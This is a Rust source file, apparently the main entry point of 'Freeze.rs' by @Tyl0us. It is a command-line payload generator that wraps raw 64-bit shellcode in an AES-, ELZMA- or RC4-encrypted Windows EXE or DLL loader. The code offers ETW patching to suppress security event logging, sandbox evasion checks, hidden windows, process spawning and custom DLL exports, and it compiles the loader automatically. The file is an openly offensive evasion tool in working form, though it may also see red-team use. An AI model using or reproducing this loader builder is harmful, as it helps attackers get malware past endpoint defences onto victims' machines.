#![allow(warnings)]
use build::setupcargo;
use clap::{App, Arg};
use digest::Digest;
use sha2::Sha256;
use std::env;
use std::fs;
use std::fs::File;
use std::io::{BufReader, Read};
use std::process::Command;

fn main() {
    let matches = App::new(r"
    ___________                                                      
    \_   _____/______   ____   ____ ________ ____     _______  ______
     |    __) \_  __ \_/ __ \_/ __ \\___   // __ \    \_  __ \/  ___/
     |     \   |  | \/\  ___/\  ___/ /    /\  ___/     |  | \/\___ \ 
     \___  /   |__|    \___  >\___  >_____ \\___  > /\ |__|  /____  >
         \/                \/     \/      \/    \/  \/            \/    
                                        (@Tyl0us)
    Soon they will learn that revenge is a dish... best served COLD & Rusty...
    
    ")
        .arg(Arg::with_name("Output")
            .short("O")
            .long("Output")
            .value_name("OUTPUT")
            .help("Name of output file (e.g. loader.exe or loader.dll). Depending on what file extension defined will determine if Freeze makes a dll or exe.")
            .takes_value(true))
        .arg(Arg::with_name("Input")
            .short("I")
            .long("Input")
            .value_name("INPUT")
            .help("Path to the raw 64-bit shellcode.")
            .takes_value(true))
        .arg(Arg::with_name("console")
            .short("c")
            .long("console")
            .help("Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature"))
        .arg(Arg::with_name("noetw")
            .short("n")
            .long("noetw")
            .help("Disables the ETW patching that prevents ETW events from being generated."))
        .arg(Arg::with_name("Encrypt")
            .short("E")
            .long("Encrypt")
            .value_name("ENCRYPT")
            .help("Encrypts the shellcode using either AES 256, ELZMA or RC4 encryption")
            .takes_value(true))  
        .arg(Arg::with_name("Process")
            .short("p")
            .long("process")
            .value_name("PROCESS")
            .help("The name of process to spawn. This process has to exist in C:\\Windows\\System32\\. Example 'notepad.exe'  ")
            .takes_value(true))
        .arg(Arg::with_name("sandbox")
            .short("s")
            .long("sandbox")
            .help("Enables sandbox evasion by checking:
            Is Endpoint joined to a domain?
            Does the Endpoint have more than 2 CPUs?
            Does the Endpoint have more than 4 gigs of RAM?"))
        .arg(Arg::with_name("export")
            .short("export")
            .long("export")
            .help("Defines a custom export function name for any DLL.")
            .takes_value(true))                         
        .get_matches();
    println!(r"
    ___________                                                      
    \_   _____/______   ____   ____ ________ ____     _______  ______
     |    __) \_  __ \_/ __ \_/ __ \\___   // __ \    \_  __ \/  ___/
     |     \   |  | \/\  ___/\  ___/ /    /\  ___/     |  | \/\___ \ 
     \___  /   |__|    \___  >\___  >_____ \\___  > /\ |__|  /____  >
         \/                \/     \/      \/    \/  \/            \/    
                                        (@Tyl0us)
    Soon they will learn that revenge is a dish... best served COLD & Rusty...
    
    ");

    if !matches.is_present("Input") {
        eprintln!("Error: Please provide a path to a file containing raw 64-bit shellcode (i.e .bin files)");
        std::process::exit(1);
    }
    let mut process = matches.value_of("Process").unwrap_or("notepad.exe");
    let encrypt = matches.value_of("Encrypt").unwrap_or("RC4");
    let allowed_outputs = ["ELZMA", "AES", "RC4"];
    if !allowed_outputs.contains(&encrypt) {
        eprintln!(
            "Error: Output must be one of the following: {:?}",
            allowed_outputs
        );
        std::process::exit(1);
    }
    let mut dll: bool = false;
    let mut fullfile = matches.value_of("Output").unwrap_or("payload.exe");
    let mut file = matches.value_of("Output").unwrap_or("payload.exe");
    if let Some(output) = matches.value_of("Output") {
        if file.ends_with(".exe") {
            if matches.is_present("export") {
                eprintln!("Error: Export option is only for .dll payloads not .exe");
                std::process::exit(1);
            }
            file = file.split(".exe").next().unwrap();
            dll = false;
        }
        if file.ends_with(".dll") {
            if matches.is_present("console") {
                eprintln!("Error: Console option is only for .exe payloads not .dll");
                std::process::exit(1);
            }
            file = file.split(".dll").next().unwrap();
            dll = true;
        }
    } else {
        eprintln!("Error: File argument is required.");
        std::process::exit(1);
    }
    let console = matches.is_present("console");
    setupcargo(
        matches.value_of("Input").unwrap(),
        file,
        encrypt,
        process,
        matches.value_of("export"),
        dll,
        matches.is_present("sandbox"),
    );
    buildfile(file, console, matches.is_present("sandbox"), matches.is_present("noetw"));
    cleanup(file, fullfile);
}

fn buildfile(project_name: &str, console: bool, sandbox: bool, etw: bool) {
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    env::set_current_dir(&project_path).expect("Failed to change directory to Rust project");
    let mut args = if cfg!(target_os = "windows") {
        vec!["build", "--release"]
    } else {
        vec!["build", "--release", "--target", "x86_64-pc-windows-gnu"]
    };
    args.push("--quiet");
    
    let mut features = String::new();

    if console {
        features.push_str("console_mode");
    }
    if !console {
        features.push_str("hide");
    }
    if sandbox{
        features.push(' ');
        features.push_str("sandbox");
    }
    if !etw{
        features.push(' ');
        features.push_str("ETW");
    }

    if !features.is_empty() {
        args.push("--features");
        args.push(&features);
    }

    let status = Command::new("cargo")
        .args(&args)
        .status()
        .expect("Failed to execute 'cargo build'");

    if !status.success() {
        eprintln!("Error: 'cargo build' failed");
        std::process::exit(1);
    }
    env::set_current_dir(&original_path).expect("Failed to change directory back to original path");
    println!("[*] Compiling Payload");
}

pub fn cleanup(project_name: &str, file_name: &str) {
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    let compiled_file = if cfg!(target_os = "windows") {
        project_path
            .join("target")
            .join("release")
            .join(format!("{}", file_name))
    } else {
        project_path
            .join("target")
            .join("x86_64-pc-windows-gnu")
            .join("release")
            .join(format!("{}", file_name))
    };
    if !compiled_file.exists() {
        eprintln!("Error: Compiled file not found");
        std::process::exit(1);
    }

    let target_file = original_path.join(format!("{}", file_name));
    println!("[*] {} Compiled", file_name);

    fs::copy(compiled_file, &target_file).expect("Failed to copy compiled file");
    fs::remove_dir_all(project_path).expect("Failed to remove Rust project folder");

    let mut file = File::open(target_file).expect("Failed to open file");
    let mut buf_reader = BufReader::new(file);
    let mut hasher = Sha256::new();
    let mut buffer = [0; 1024];
    loop {
        let bytes_read = buf_reader.read(&mut buffer).expect("Failed to read file");
        if bytes_read == 0 {
            break;
        }
        hasher.update(&buffer[..bytes_read]);
    }
    let result = hasher.finalize();
    println!("[*] SHA-256 hash: {:x}", result);
}
